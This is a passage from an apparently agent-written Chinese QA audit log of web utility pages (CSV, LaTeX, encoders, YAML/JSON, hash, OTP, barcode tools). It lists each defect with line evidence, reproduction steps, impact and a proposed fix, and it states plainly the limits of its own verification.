- 证据：`tools/it/csv-to-html-table.html:305-313`（拼表头/表体）、`:314`（覆盖）、`:315-316`（写 `htmlOut`/`previewBox`）、`:327`（复制只查 `indexOf('table')`，仍能通过）。
- 复现（node 实跑默认 CSV `name,age,city\nAlice,28,Shanghai`）：`htmlOut` = `"  </tbody>\n</table>"`；预览为 `…预览（2 行）</div>  </tbody>\n</table>`（浏览器的孤立闭合标签被丢弃 → 空白）；期望完整 `<table><thead>…<tbody>…</table>`。
- 影响：页面唯一的产出与预览功能 100% 失效；复制/下载得到无意义片段，FAQ :201 的转义承诺也无从体现。
- 方案：`:314` 改为 `h += '  </tbody>\n</table>';`；补回归断言"输出含 `<table>`、`<th>`、`<td>` 且行数匹配"。
**留存建议（tools/it/csv-to-html-table.html）**：`:314` 是本页核心事故点，一行修复 + 一条回归即可。

### IT-N304 单元格文本中的 "NaN"/"Infinity" 被替换成 "—"（低，确认缺陷）
- 2026-11-06 基线 `0781ef7e61` 独立 Chrome 复核：CSV `name,value` 换行 `NaN,Infinity Labs` 产出 `<td>—</td><td>— Labs</td>`，预览同样被改写；问题仍存在，不重复编号。
- 当前基线另复现空输入：清空 CSV 输入后仍生成 Alice/Bob 示例表格并可复制/下载。`calcTool()` 第 300–301 行对空值强制回退样例；输入区初始示例还包含 Carol。用户可能误将虚构示例当成当前结果，建议空态清除输出并提示，示例通过显式按钮载入。
- 问题：`escH` 在转义前做 `String(s).replace(/Infinity|NaN/g,'—')`，把合法数据值改写为破折号；该替换本意是数值 NaN 兜底，却作用于所有文本单元格。
- 证据：`tools/it/csv-to-html-table.html:297`。
- 复现：CSV `v\nNaN` → 单元格输出 `—`（期望 `NaN`）；`NaNValue` → `—Value`。
- 影响：数据被静默篡改，且与"HTML 转义"语义无关。
- 方案：`escH` 只做 HTML 转义；数值兜底移到统计/格式化处。
**留存建议（tools/it/csv-to-html-table.html）**：`:297` 拆成纯转义 + 数值格式化两件事。

### IT-N305 LaTeX 搜索不是"即时筛选"，必须点"计算"（中，确认缺陷）
- 问题：说明写"输入关键词…即时筛选"，但 `#q` 无 `oninput`，全文也无 input 事件监听，仅在点击"计算"时调用 `calcTool()`。
- 证据：`tools/it/latex.html:112`（承诺即时筛选）、`:116`（`<input type="text" id="q" value="">` 无 oninput）、`:120`（计算按钮）、`:202-203`（筛选逻辑只在 calcTool 内）。
- 复现：输入 `alpha` 后不点按钮 → 列表仍是全部符号；点"计算"才过滤；期望输入即筛选。
- 影响：与宣传不符，多一步操作且易误解为搜索无结果。
- 方案：给 `q` 加 `oninput="calcTool()"`（或 `addEventListener('input',…)`），保留"计算"按钮。
**留存建议（tools/it/latex.html）**：`:116` 补一个 oninput 即可，成本极低。

### IT-N306 复制命令无论成败都提示"已复制"（中，确认缺陷）
- 问题：`copyLatex` 使用已废弃的 `document.execCommand('copy')`，返回值被忽略、无 Clipboard API 兜底，随后无条件写入"已复制 cmd"。
- 证据：`tools/it/latex.html:208`（`try{document.execCommand('copy')}catch(e){}` 后 `tip.textContent='已复制 '+cmd`）。
- 复现：在禁用剪贴板权限或不支持 execCommand 的环境点命令 → 剪贴板未变，提示仍显示"已复制 \alpha"。
- 影响：用户以为已复制、粘贴出旧内容；失败无提示无从排查。
- 方案：优先 `navigator.clipboard.writeText`，失败时提示"复制失败，请手动选择"；同时判断 execCommand 的布尔返回值。
**留存建议（tools/it/latex.html）**：`:208` 改异步复制并处理失败分支。

### IT-N307 搜索只匹配命令与中文说明，不匹配显示符号（低，确认缺陷）
- 问题：`filter` 只查 `e[0]`（命令）与 `e[2]`（说明），不查 `e[1]`（符号），搜 `∑`、`α`、`→` 得到 0 条。
- 证据：`:203`；`:201`（数据格式为 `[命令, 符号, 说明]`）。
- 复现：输入 `∑` → "共 0 条"；期望命中 `\sum`。
- 影响：用户"按符号反查命令"这一最常见路径不可用。
- 方案：条件加入 `e[1].indexOf(q)>=0`。
**留存建议（tools/it/latex.html）**：`:203` 加一个字段即可。

### IT-N308 引据表承诺"国际区号"，数据与详情均无该字段（中，确认缺陷）
- 问题：参考资料表写明"国家码 1-3 位 / E.164"，但 `COUNTRIES` 无 `dial` 字段，详情面板只显示首都/货币/语言/面积/大洲。
- 证据：`tools/it/country-flag.html:235`、`:253-302`（数据项无 dial）、`:330-341`（详情模板）。
- 复现：搜索 `+86` 或任意区号 → 0 条；点中国详情 → 无国际区号。
- 影响：标题"国家代码与旗帜"易被理解为含电话区号，引据与实际能力不符。
- 方案：补 `dial` 字段并在详情/搜索/导出中使用，或删掉该引据行。
**留存建议（tools/it/country-flag.html）**：`:235` 与数据字段二选一，别留空承诺。

### IT-N309 仅收录 48 国且无"未收录"提示，常见国家搜不到（中，确认缺陷）
- 问题：`COUNTRIES` 只有 48 条，搜索 `巴基斯坦`、`伊朗`、`匈牙利`、`埃塞俄比亚` 等返回"共 0 个国家/地区"，页面未说明数据不完整。
- 证据：`tools/it/country-flag.html:253-302`（数据全集）、`:312-315`（过滤后直接渲染）、`:325`（只显示命中数）。
- 复现（node 统计）：数组长度 48、无 dial；输入"巴基斯坦" → filtered 为空 → 显示"共 0 个国家/地区"。
- 影响：用户误判为工具故障或数据错误；与"国家代码查询"预期不符。
- 方案：补全 ISO 3166-1 全部代码（旗帜可由 code 推导），或在无结果时提示"当前仅收录 48 个常用国家/地区"。
**留存建议（tools/it/country-flag.html）**：优先补数据；短期至少加空结果说明。

### IT-N310 十进制编码选"无分隔符"后无法解码，往返断裂（高，确认缺陷）
- 问题：`enc` 用 `Array.from(bytes).join(sep)`，`sep=''` 时各字节直接粘连；`dec` 却按 `/[\s,\-;]+/` 切分后要求每个片段 0–255，粘连串必然越界。
- 证据：`tools/it/decimal-encode.html:166`（`<option value="">无</option>`）、`:260`（join）、`:266`（split）、`:270`（越界即 alert）。
- 复现（node 实跑）：输入 `Hi` + 分隔符"无" → 编码 `72105`；再解码 `72105` → "非法十进制数: 72105"；期望原样还原 `Hi`，或不下发该选项。
- 影响：UI 提供的选项产出自己无法消费的结果，破坏可逆性。
- 方案：无分隔符时按定长 3 位补零（或禁用该选项），并在帮助中说明不可逆风险。
**留存建议（tools/it/decimal-encode.html）**：`:166` 与 `:260/:266` 必须成对设计，不能只改一端。

### IT-N311 说明把输出当"Unicode 码点"，实际是 UTF-8 字节，"中"≠20013（中，确认缺陷）
- 问题：公式列表写"取每个字符的 Unicode 码点"，FAQ 写"超出 127 的字符需用 Unicode 码点（如'中'=20013）"，但实现先 `TextEncoder` 再逐字节输出；`中` 实际输出 `228 184 173`，按 20013 解码会被判非法。
- 证据：`:147`（"取每个字符的 Unicode 码点"）、`:206`（FAQ 中=20013）、`:258`（`new TextEncoder().encode`）、`:260`（逐字节 join）、`:270`（>255 拒绝）。
- 复现（node）：`enc('中',' ')` → `228 184 173`；`dec('20013')` → "非法十进制数: 20013"。
- 影响：用户按文档处理非 ASCII 会得到与预期不符的结果且无法解释。
- 方案：统一口径为 UTF-8 字节（改 :147/:206 文案并给出 `中` 的字节示例），或改为输出 Unicode 码点并相应调整解码。
**留存建议（tools/it/decimal-encode.html）**：`:147`、`:206` 与实现二选一，别让文档与代码对立。

### IT-N312 解码用 `parseInt` 宽松解析，`65x` 被接受、`0x41` 静默变 0（低，确认缺陷）
- 问题：`parseInt(parts[i],10)` 忽略尾部垃圾；`0x41` 以 10 进制解析只读到 `0`，页面不报错。
- 证据：`tools/it/decimal-encode.html:269-271`。
- 复现（node）：解码 `65x 66` → `AB`（期望报非法）；`0x41 0x42` → 两个 NUL（期望报非法或提示改用十六进制工具）。
- 影响：脏数据被静默按错误值解码。
- 方案：先用 `/^\d+$/` 校验整段，再 `Number(part)`；对 `0x` 前缀给出明确提示。
**留存建议（tools/it/decimal-encode.html）**：`:269-270` 换成严格整数校验。

### IT-N313 非法 UTF-8 静默替换为 U+FFFD，且 FAQ 承诺的 GBK 并无对应选项（中，确认缺陷）
- 问题：`new TextDecoder()` 默认 `fatal:false`，解码失败时把每个坏字节变成 U+FFFD，页面无警告，复制出去即丢数据；FAQ 建议"不行再换 GBK"，但页面没有字符集选择。
- 证据：`tools/it/hex-to-text.html:266`（`new TextDecoder().decode(bytes)`）、`:204`（FAQ 换 GBK）、`:161-164`（只有输入/输出两个 textarea）。
- 复现（node）：输入 `80` → 输出 `�`（U+FFFD），无任何提示；期望提示"字节序列不是合法 UTF-8"或提供 GBK/Latin-1 选项。
- 影响：取证/协议分析场景下静默丢字节，结论失真。
- 方案：用 `new TextDecoder('utf-8',{fatal:true})` 捕获异常并提示，或增加字符集下拉（`TextDecoder('gbk')` 浏览器已内置）。
**留存建议（tools/it/hex-to-text.html）**：`:266` 加 fatal 与错误提示，或补字符集下拉。

### IT-N314 复制按钮依赖全局 `event`，Firefox 下无反馈（低，确认缺陷）
- 问题：`copyResult` 在 `clipboard.writeText().then()` 回调里用 `event.target`；`window.event` 仅 Chromium 系有，Firefox/Safari 中 `event` 未定义，回调抛 ReferenceError，按钮文案不恢复；写剪贴板失败也没有 catch。
- 证据：`tools/it/hex-to-text.html:272-275`（`event.target.closest('.btn')`）、`:269-271`（取值为空直接 return）。
- 复现：Firefox 打开页面点"复制结果" → 剪贴板可能已写入，但控制台报 `ReferenceError: event is not defined`，按钮无"✅ 已复制"反馈；期望两种浏览器都给出反馈。
- 影响：与 AGENTS §5 主流浏览器兼容要求不符；失败无提示。
- 方案：把按钮元素显式传入（`onclick="copyResult(this)"`），不要依赖隐式 `event`；并给 `writeText` 加 `.catch` 提示失败。
**留存建议（tools/it/hex-to-text.html）**：`:269-276` 改为显式传参 + 失败分支。

### 承诺 vs 实际（S 批专项）
- `tools/it/des.html:166`、`:263`：承诺"3DES 密钥 112/168 位""维护老系统时解密历史数据"，实际密钥编排只剩 1 字节有效、输出与标准不兼容（N294、N295）；`:155` 的"解密时纯十六进制且偶数长度按 hex、否则 Base64"实现一致，但奇数 hex 会抛 `InvalidCharacterError`（N296）。
- `tools/it/js-formatter.html:225` 承诺"纯格式化不会改变代码行为，AST 不变"，实际注释换行与 `return` ASI 均改变语义（N297）；`:167` 写"必须基于 AST 而非简单正则"，本页是手写词法 + 深度计数（`:163`），压缩还不补分号（N298）。
- `tools/it/python-formatter.html:170` 承诺"统一空格"，实测 `x={1:2,3:4}` 原样输出；`:219` 示例"`x={1:2,3:4}` → `x = {1: 2, 3: 4}`"不成立；`:223` 的"成熟工具只做等价改写"不适用于本页（N300、N301）。
- `tools/it/csv-to-html-table.html:128` 承诺"右侧实时预览渲染效果"、`:117` 承诺生成表头区与 th，实际产物在 `:314` 被覆盖成闭合标签（N303）。
- `tools/it/latex.html:112` 承诺"输入关键词…即时筛选"，实际无 input 监听（N305）；`:160` 的"复制到编辑器即可渲染"对 `\matrix`、`\begin{cases}` 等片段（`:201`）不成立。
- `tools/it/country-flag.html:235` 的引据写"国家码 1-3 位 / E.164"，数据无 dial 字段（N308）；数据仅 48 条却以"国家代码与旗帜"整体名义提供（N309）。
- `tools/it/decimal-encode.html:10` 的 meta 写"每个字节 0–255"（与实现一致），但 `:147`/`:206` 写 Unicode 码点、`中`=20013（N311）；`:166` 提供"无分隔符"却产出自解码器拒绝的串（N310）。
- `tools/it/hex-to-text.html:204` 承诺"不行再换 GBK"，页面无字符集选项（N313）；`:203` 的"奇数位缺位会报格式错误"实现正确。

### 覆盖
- 实读 8 页：`tools/it/country-flag.html`、`tools/it/js-formatter.html`、`tools/it/hex-to-text.html`、`tools/it/des.html`、`tools/it/latex.html`、`tools/it/decimal-encode.html`、`tools/it/python-formatter.html`、`tools/it/csv-to-html-table.html`。
- 新增 21 条（高 8 / 中 9 / 低 4），编号 IT-N294~IT-N314；上一批止于 IT-N293，本批无重号。
- 未覆盖说明：只审计主流程、边界与文档口径，未穷举全部输入组合（DES 只逐字节改 0x11 观察敏感性，未做全密钥空间统计；JS 只测 5 组输入；Python 只测自带 SAMPLE 与 2 个小例；CSV 只测默认数据与引号/换行字段；country 只做数据一致性与长度统计，未核对全部国名/首都时效）。
- 未做验证：未改代码、未构建、未跑门禁、未 git 写、未开浏览器；结论为源码静态分析 + `node` 内存复算（临时脚本 `/tmp/audit_des.js`、`/tmp/audit_fmt.js`、`/tmp/audit_misc.js`，未落仓库）；DES 标准向量因本机 OpenSSL 无 `des-ecb` 采用 FIPS 公开值（key `0123456789ABCDEF` / 明文 `Now is t` → `3FA40E8A984D4815`）；未验证英文态 `?lang=en-US`、繁体与移动端。

### IT-N315 PDF 头版本号取错字节，任何合法 PDF 都被判红（高，确认缺陷）
- 问题：`head` 用 `buf[5]` + `'.'` + `buf[6]` 拼接，而 `%PDF-1.7` 的字节布局是 `[5]='1'`、`[6]='.'`、`[7]='7'`，拼出来恒为 `%PDF-1.`，正则 `/^%PDF-\d$/` 永远不匹配。
- 证据：`tools/it/pdf-signature-checker.html:271-272`。
- 复现：上传任意正常 PDF（头为 `%PDF-1.7`）→ 表格「PDF 头」显示 `%PDF-1.` 且为红色；期望显示 `%PDF-1.7` 并判绿（PDF 2.0 同理应取 `buf[7]`）。
- 影响：合法文件被标成异常，用户据此误判文件损坏；顶部「PDF 头」是唯一的前置门禁，导致整页结论不可信。
- 方案：改为 `'%PDF-' + buf[5] + '.' + buf[7]`，或直接取前 8 字节并匹配 `/^%PDF-\d\.\d/`。

### IT-N316 「签名区域字节数」用第 4 参数减第 3 参数，输出负数字节（高，确认缺陷）
- 问题：`/ByteRange` 的四个数是 `offset1 len1 offset2 len2`，被签名字节数应为 `len1 + len2`；代码却算 `br[4]-br[3]`（len2 − offset2），既不是覆盖长度也常为负数。
- 证据：`tools/it/pdf-signature-checker.html:275`（捕获四参数）、`:277`（`(parseInt(br[4])-parseInt(br[3]))+' bytes'`）；`:112` 的公式说明同样写错。
- 复现：`/ByteRange [0 8000 9000 1200]` → 页面显示 `-7800 bytes`；期望 `9200 bytes`（即 8000+1200）。
- 影响：签名覆盖范围是判断「增量更新是否被签」的关键数值，负值直接误导取证与合规检查。
- 方案：改为 `br[1]+br[3]` 的数值和（`parseInt(br[2])+parseInt(br[4])`），并同步修正 `:112` 的公式文案。
**假工具候选：是（类型 C）** —— `:134` 明说「不做签名内容有效性验证」，但深度解析 `:160-166` 仍宣称「校验 PKCS#7 签名与证书链」「摘要不符会标记篡改」，实际只做 ByteRange/Contents 存在性匹配。

### IT-N317 八进制选「无分隔符」或「\\」分隔后无法解码，往返断裂（高，确认缺陷）
- 问题：`enc` 用 `parts.join(sep)`；`dec` 只按 `/[\s,\-;]+/` 切分，既不认空分隔产生的粘连串，也不认 `\\` 分隔。
- 证据：`tools/it/octal-encode.html:164`（`<option value="">无</option>`）、`:166`（`<option value="\\">`）、`:266`（join）、`:275`（split 正则）、`:278`（parseInt）。
- 复现（node/py 口径）：输入 `AB`、分隔符「无」→ 编码 `101102`；切到解码 → 「非法八进制数: 101102」。输入 `AB`、分隔符 `\\` → 编码 `101\\102`；解码只得到 `A`（`parseInt('101\\102',8)=101`），期望还原 `AB`。
- 影响：UI 提供 4 个分隔符，其中 2 个产出的结果自己消费不了，且 `\\` 分支是静默丢字节而非报错。
- 方案：解码按所选分隔符切分（空分隔走定长 3 位分组），或直接下掉「无 / \\」两个选项；`\\` 分隔需与 `:275` 的切分集合成对维护。

### IT-N318 解码 `parseInt` 宽松截断，非法数字被静默解成别的字节（高，确认缺陷）
- 问题：`parseInt(parts[i],8)` 遇非法字符即停止，不校验整段；`078`、`378` 这类串被当成合法值。
- 证据：`tools/it/octal-encode.html:278-280`。
- 复现（node）：`parseInt('078',8)=7`、`parseInt('378',8)=31` → 页面把 `078` 解码成 U+0007、把 `378` 解码成 U+001F；期望两例都提示「非法八进制数」。
- 影响：脏数据/手误被静默转成控制字符，复制出去即污染文本，且页面不给任何告警。
- 方案：先 `/^[0-7]{1,3}$/` 校验再 `Number()`；长度不足 3 位可报警或按规范要求补齐。

### IT-N319 点「重置」会把三个字符集全部取消，页面只剩错误提示（中，确认缺陷）
- 问题：`resetForm()` 把 upper/lower/digit 三个默认勾选的复选框都置 `false`，随后 `calcTool()` 落入 `if(!set)` 分支。
- 证据：`tools/it/random-string.html:268-274`（`checked=false`）、`:240`（`请至少选择一种字符集` 后 return）。
- 复现：打开页面（默认已勾选大写/小写/数字）→ 点「重置」→ 结果区变成「请至少选择一种字符集」，无任何输出；期望恢复出厂默认并立即生成 5 条示例。
- 影响：最常用的「重置」把工具重置成不可用态，用户需手动重新勾选。
- 方案：重置时按 HTML 初始默认态恢复（`top_upper/top_lower/top_digit = true`，`top_sym = false`），或直接调用页面初始化分支。

### IT-N320 XML 混合内容丢正文，只剩子元素（高，确认缺陷）
- 问题：有子元素时只递归 `node.children`，完全不读取 `node.textContent`；`kids.length>0` 分支没有任何文本兜底。
- 证据：`tools/it/xml-to-json.html:264-275`（`:269` 只遍历 kids，`:275` 直接返回 obj）。
- 复现：输入 `<p>Hello <b>world</b>!</p>` → 输出 `{"p":{"b":"world"}}`，`Hello ` 与 `!` 两个文本段永久丢失；期望保留为 `{"p":{"#text":"Hello !","b":"world"}}` 或至少给出不支持的告警。
- 影响：HTML/RSS/SVG 等混合内容 XML 转换后正文缺失，且页面仍提示「✅ 转换成功」，用户无从察觉。
- 方案：有子元素时收集直接文本节点，非空则写入 `#text`（与 `:267` 的叶节点口径保持一致）。

### IT-N321 划分子网数量无上限，`/8` 配 1677 万子网会冻死标签页（中，确认缺陷）
- 问题：`subN` 只有 `min="1"` 无 `max`，`realN = 2^bits` 直接进 `for` 循环并逐行建表格，没有任何规模上限或分批。
- 证据：`tools/it/calc-subnet.html:134`（无 max）、`:307-313`（`bits=ceil(log2(n))`、`realN` 循环）。
- 复现：IP `10.0.0.0`、前缀 `/8`、N=`16777216` → `bits=24`、`newPrefix=32`、`realN=16777216`，循环构造 1677 万行 → 页面长时间无响应/崩溃；期望提示「超出展示上限」或限制 N ≤ 1024。
- 影响：一次合法输入即可让页面卡死，移动端必然崩溃。
- 方案：对 `realN` 设阈值（如 4096）直接拒绝，或改为分页/懒渲染；`:329` 的汇总文案同步提示已截断。

### IT-N322 生成数量超过 15 后循环复用同一批键，.env 出现重复键（高，确认缺陷）
- 问题：`ENV_KEYS` 固定 15 条，`n` 上限 50，生成时用 `shuffled[i % shuffled.length]` 取模，超过 15 即重复整组键值。
- 证据：`tools/it/generator-16.html:208-222`（15 组键值）、`:225`（`Math.min(...,50)`）、`:230`（`i % shuffled.length`）。
- 复现：数量填 `20` → 输出中 `DATABASE_URL=postgres://...` 出现两次、`REDIS_URL` 等也重复；期望 20 个唯一键，或数量上限收紧到 15 并提示。
- 影响：多数 .env 解析器「后者覆盖前者」，重复键让最终生效配置与用户看到的清单不一致；同时所有值都是硬编码占位（`JWT_SECRET=change-me-in-production`），并未真正生成随机密钥。
- 方案：超过 15 时拒绝并提示，或按键名生成唯一后缀；若要保留「生成器」定位，至少为密钥类字段用 `crypto.getRandomValues` 生成随机值。
**假工具候选：是（类型 A）** —— 唯一输入只有「数量」，输出恒为固定 15 条硬编码键值轮转，不存在任何按用户输入生成/随机化的内容。

### IT-N323 「复制」把所有昵称无分隔拼成一串（中，确认缺陷）
- 问题：每条结果是一个 `<div class="code-row">`，`copyResult` 直接取容器 `textContent`，块级元素之间没有换行符。
- 证据：`tools/it/gamertag-generator.html:293`（逐条 `<div>`）、`:299-300`（`output.textContent` 写剪贴板）。
- 复现：生成 3 条 → 剪贴板得到 `ShadowWolf7NeonBlade12CyberFox3`（三个名字连成一串），期望每行一个昵称。
- 影响：复制出的候选名无法直接粘贴进注册表单或表格，用户需手工切分。
- 方案：复制时按 `.code-row` 逐条收集 `textContent` 并用 `\n` join，或改用 `<pre>`/`<br>` 结构。

### IT-N324 ITF 起止符画错，生成的条码缺少扫描器必需的 guard（高，确认缺陷）
- 问题：起始符写成 `'0000'`（四个空格，等于不画任何东西）；终止符写成 `'100'`（窄条-窄空-窄条），而 ISO/IEC 16390 要求起始 `1010`、终止 `11010`（宽条-窄空-窄条）。
- 证据：`tools/it/barcode-itf.html:253`（`let bits='0000'`）、`:264`（`bits+='100'`）。
- 复现：输入 `1234` 生成 PNG → 图像左端无起始 guard、右端是窄窄窄收尾；用扫码枪/手机扫描无法识读。node 侧按规范应为左 `1010` + 数据 + 右 `11010`。
- 影响：工具宣称「生成 ITF 条码」，实际产物不符合标准，任何扫描器都解不出，等同不可用。
- 方案：起始改为 `1010`、终止改为 `11010`；同时补宽窄比校验（当前 1:3 合法，但需在说明中固定）。

### IT-N325 画布文字、页面文字、复制内容三者不一致（中，确认缺陷）
- 问题：编码用 `text.replace(/\D/g,'')`（且奇数位前面补 `0`），画布底部却用未补零的数字串；`.bar-text` 与复制又用原始输入（含字母、未补零）。
- 证据：`tools/it/barcode-itf.html:292`（画布文案 = 去非数字、未补零）、`:294`（`.bar-text` = 原始 `text`）、`:299-300`（复制该文本）。
- 复现：输入 `ITF1234` → 条码实际编码 `1234`，画布显示 `1234`，页面下方与剪贴板显示 `ITF1234`；输入 `12345` → 实际编码前补 `0` 成 `012345`，画布仍显示 `12345`。期望三处统一为实际编码值（含补位）。
- 影响：人工核对/入库时以页面或复制文本为准，会与实际条码内容不符。
- 方案：把「补零后的规范化值」作为唯一真值，同时传给 `drawBarcode`、`.bar-text` 和复制逻辑。

### IT-N326 YAML 块标量 `|` / `>` 后的全部内容被丢弃（高，确认缺陷）
- 问题：`desc: |` 的 `val` 是 `'|'`，被当普通标量处理后 `p.i` 指向下一行；外层 `while` 只接受与当前 `indent` 相同的行，遇到缩进更深的块内容立即退出并返回，后续同级键全部丢失。
- 证据：`tools/it/yaml-to-json.html:256`（`while(...ind===indent)`）、`:262`（`|` 走 `yScalar`，未识别块标量）。
- 复现：输入 `desc: |` + 缩进两行的 `hello`、`world`，再接 `name: test` → 输出 `{"desc":"|"}`，`hello/world/name` 全部消失；期望 `{"desc":"hello\nworld\n","name":"test"}`。
- 影响：K8s/CI 配置里大量使用块标量，转换结果静默丢掉大段配置，且仍提示成功。
- 方案：识别 `|`/`>`（含 `|-`、`>-`）后按缩进收集连续行并按折叠规则拼接，再继续外层解析。

### IT-N327 YAML 行内注释未剥离，`8080 # note` 变成字符串（高，确认缺陷）
- 问题：`yScalar` 只对整行 `#` 开头的注释做跳过，行尾 `#` 原样保留在值里，类型判定随之中断。
- 证据：`tools/it/yaml-to-json.html:237`（仅跳过 `s[0]==='#'`）、`:232`（`return s` 原样返回）。
- 复现：`port: 8080  # 服务端口` → 输出 `{"port":"8080  # 服务端口"}`（字符串），期望 `{"port":8080}`。
- 影响：最常见 YAML 写法直接导致数值/布尔类型退化，下游按类型消费时出错。
- 方案：在引号外的第一个 `#`（前有空白）处截断再 trim；保留引号内的 `#`。

### IT-N328 JSON 空字符串转成 YAML `null`（高，确认缺陷）
- 问题：`toYaml('')` 返回空串，父级拼成 `k: `（冒号后无内容），YAML 语义为 null。
- 证据：`tools/it/json-to-yaml.html:273-276`（空串不进入任何加引号分支）、`:285`（`pad + k + ': ' + toYaml(...)`）。
- 复现：`{"k":""}` → 输出 `k: ` → 用任意 YAML 解析器读回为 `{k:null}`；期望 `k: ""`。
- 影响：空字符串与 null 是可区分的业务语义（如「显式清空」vs「未设置」），转换后丢失。
- 方案：`v===''` 时返回 `'""'`（与 `yNeedQ` 的 `v===''` 判定对齐）。

### IT-N329 「压缩转换」把每行 trim 掉缩进，层级结构被拍平（高，确认缺陷）
- 问题：`doMinYaml` 对 `toYaml` 结果逐行 `.trim()` 再 join，嵌套缩进全部消失，YAML 语义改变。
- 证据：`tools/it/json-to-yaml.html:301`（`split('\n').map(l => l.trim())`）。
- 复现：`{"a":{"b":1}}` → 正常输出 `a:\n  b: 1`；点「压缩转换」得到 `---\na:\nb: 1`，解析为 `{a:null,b:1}`；期望压缩只删空行、不改缩进。
- 影响：压缩结果与原文不等价，且页面仍提示「✅ 压缩转换」，用户拿去部署即出错。
- 方案：压缩仅过滤空白行与行尾空白（`replace(/\s+$/,'')`），保留前导空格。

### IT-N330 OTP 复制把「X 秒后刷新」一起写进剪贴板（中，确认缺陷）
- 问题：输出容器同时含验证码 `<div class="code-row">` 和倒计时文本，`copyResult` 取整个容器 `textContent`，两段无换行直接粘连。
- 证据：`tools/it/otp-generator.html:317`（code-row）、`:321`（timer 文本）、`:335-336`（`output.textContent` 写剪贴板）。
- 复现：TOTP 模式点「复制」→ 剪贴板为 `12345623 秒后刷新`（或 `123456`+`30 秒后刷新` 粘连），期望只有 6/8 位数字。
- 影响：粘贴进 2FA 输入框会多出非数字字符，验证直接失败；每秒刷新还会在整分边界换码，用户复制的可能是上一窗口的码。
- 方案：复制只取 `.code-row` 的文本；倒计时进度单独渲染并用 `aria-live`，不进入复制源。

### IT-N331 改维度后直接点「计算乘法」触发 null 解引用（中，确认缺陷）
- 问题：`getM` 按新维度拼 `id` 取输入框，但矩阵 DOM 只在点「构建矩阵」时重建；改 A 列数后未重建，读取不存在的 `a4/a5`。
- 证据：`tools/it/matrix-multiplier.html:283`（`document.getElementById(prefix+(i*cols+j)).value`）、`:305`（只校验 `ac!==br`，未校验 DOM 是否重建）。
- 复现：A 由 2×2 改为 2×3（只改「列」输入），不点「构建矩阵」直接点「计算乘法」→ `Cannot read properties of null (reading 'value')`，结果区无输出；期望自动重建或提示「请先构建矩阵」。
- 影响：输入维度与控件不同步时页面抛异常，用户看到按钮「没反应」。
- 方案：`calculate()` 开头先校验所需 `id` 是否存在（或比较维度与已建控件数量），不匹配则先 `build()`；`getM` 对 null 给出明确提示。

### IT-N332 文件 MD5 先 `TextDecoder` 解码再重编码，二进制文件结果必然错（高，确认缺陷）
- 问题：文件分支 `strData=null`，走 `md5(new TextDecoder().decode(bytes))`；UTF-8 解码会把二进制坏字节变成 U+FFFD，`md5()` 内部再按 UTF-16→UTF-8 编码，已无法还原原始字节。
- 证据：`tools/it/hash.html:548-563`（`strData` 为 null 时 `TextDecoder().decode(bytes)` 再 `md5(str)`）、`:459`（`utf8Encode` 逐 UTF-16 单元编码）。
- 复现：上传任意 PNG/JPG → 页面 MD5 与 `md5sum 文件` 不一致；上传含 emoji 的 UTF-8 文本文件同样不一致（emoji 字节 `f0 9f 98 80` 被重编码成 CESU-8 `ed a0 bd ed b8 80`）。期望对原始 `ArrayBuffer` 计算摘要。
- 影响：校验和工具的核心用途（比对下载文件完整性）完全失效，且结果看起来「像 MD5」，极具迷惑性。
- 方案：为字节数组实现独立 MD5（直接吃 `Uint8Array`，不做字符串编解码），文件分支不要走 `TextDecoder`。

### IT-N333 文本 MD5 对非 BMP 字符按 UTF-16 单元编码，结果与标准不符（高，确认缺陷）
- 问题：`utf8Encode` 对每个 `charCodeAt` 单独判断区间，遇到代理对（emoji、部分 CJK 扩展）会分别编成两个 3 字节序列（CESU-8），而标准 MD5 应按 UTF-8 4 字节编码。
- 证据：`tools/it/hash.html:459`（`for(n=0;n<string.length;n++){var c=string.charCodeAt(n);...}`）。
- 复现（node 实算）：输入 `😀` → 页面 `f99f51c2a9630a7f6b8c13c1818bc0c2`，标准 `md5("😀")` 为 `2a02eac39d716a70ecf37579185927b6`；页面实际编码字节 `ed a0 bd ed b8 80`，标准应为 `f0 9f 98 80`。
- 影响：含 emoji/生僻字的文本 MD5 与 `md5sum`、服务端校验全部不一致，用户会误以为文件被篡改。
- 方案：`utf8Encode` 先按码点处理代理对（`String.fromCodePoint` 口径），或直接用 `TextEncoder` 得到字节后对字节做 MD5。

## T 批 IT 第 1 轮覆盖（2026-11-04）
- 本轮审计 24 页：`pdf-signature-checker`、`emoji-meaning`、`octal-encode`、`random-string`、`xml-to-json`、`mongodb-cheatsheet`、`vector-dot-product`、`ulid-generator`、`calc-subnet`、`generator-16`、`http-methods`、`gamertag-generator`、`sql-cheatsheet`、`stopwatch`、`ecdsa`、`barcode-itf`、`yaml-to-json`、`json-to-yaml`、`xml-validator`、`uuid-v7-generator`、`otp-generator`、`matrix-multiplier`、`url-encoder-advanced`、`hash`（均为 `tools/it/<slug>.html`）。
- 新增 19 条（高 13 / 中 6），编号 IT-N315~IT-N333；上一批止于 IT-N314，本批无重号。
- 假工具候选 2 页：`pdf-signature-checker`（类型 C：宣称 PKCS#7/证书链验签，实为 ByteRange+Contents 存在性匹配）、`generator-16`（类型 A：仅按数量轮转固定 15 条硬编码 .env 键值，无随机生成）。
- 无高优、仅记录覆盖的页面：`emoji-meaning`、`mongodb-cheatsheet`、`vector-dot-product`、`ulid-generator`、`http-methods`、`sql-cheatsheet`、`stopwatch`、`ecdsa`、`xml-validator`、`uuid-v7-generator`、`url-encoder-advanced`（逐页读主流程与边界，未发现可复现的高优缺陷）。
- 数值核验：MD5/CRC32/Adler-32 与 RFC 4226/6238 测试向量、base32 解码、PDF 头字节偏移、ByteRange 差值均用 `node -e` 实算（`md5("abc")=900150983cd24fb0d6963f7d28e17f72`、`crc32("abc")=352441c2`、`adler32("abc")=024d0127`、`HOTP(c=0)=755224`、`TOTP(t=59,8位)=94287082`）。
- 未做浏览器/门禁/线上验证（未改工具页与构建产物、未跑 `_build.py`/`run_gates.py`、未做 git 写、未开浏览器）。

### IT-N334 Baudot 码表缺「8」，数字 8 被静默丢弃（高，确认缺陷）
- 问题：FIGS 码表缺少标准 ITA2 的 code 6 = `8`，编码时匹配不到任何表项即被跳过，且不提示。
- 证据：`tools/it/baudot-code.html:259`（`FIGS` 定义无 key 6）、`:274-292`（enc 未命中即 `continue` 丢弃）
- 复现：格式=二进制，输入 `8` → 实际输出空字符串，期望 `11011 00110`（FIGS 切换=27，8=6）；输入 `H8I` → 实际 `10100 00110`（8 消失且无 FIGS 切换），期望 `10100 11011 00110 11111 00110`（补 LTRS 回切=31）。
- 影响：含数字 8 的报文被静默改写，与真实 ITA2 设备互通时错码。
